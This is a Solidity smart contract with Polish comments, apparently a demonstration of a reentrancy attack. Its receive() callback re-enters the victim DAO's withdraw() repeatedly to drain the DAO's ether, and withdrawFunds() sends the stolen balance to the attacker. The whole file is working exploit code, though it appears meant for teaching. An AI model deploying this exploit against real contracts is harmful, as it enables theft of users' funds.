// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVictimDAO {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVictimDAO public victim;
    address public owner;
    uint256 public attackCount; // Licznik kroków reentrancy

    // Definiujemy zdarzenia dla atakującego
    event AttackStarted(uint256 initialValue);
    event ReentrancyStep(uint256 stepNumber, uint256 victimBalanceRemaining);
    event AttackFinished(uint256 totalStolen);

    constructor(address _victim) {
        victim = IVictimDAO(_victim);
        owner = msg.sender;
    }

    receive() external payable {
        // Jeśli w DAO zostało jeszcze co najmniej 0.1 ETH, wchodzimy ponownie!
        if (address(victim).balance >= 0.1 ether) {
            attackCount++;
            emit ReentrancyStep(attackCount, address(victim).balance);
            victim.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value == 0.1 ether, "Do ataku musisz wplacic dokladnie 0.1 ETH");
        attackCount = 0; // Reset licznika przed atakiem
        
        emit AttackStarted(msg.value);

        // 1. Legalnie wpłacamy 0.1 ETH do ofiary
        victim.deposit{value: 0.1 ether}();
        
        // 2. Natychmiast żądamy zwrotu, co uruchomi pętlę w receive()
        victim.withdraw();

        emit AttackFinished(address(this).balance);
    }

    function withdrawFunds() external {
        require(msg.sender == owner, "Tylko haker");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Wyplata nieudana");
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}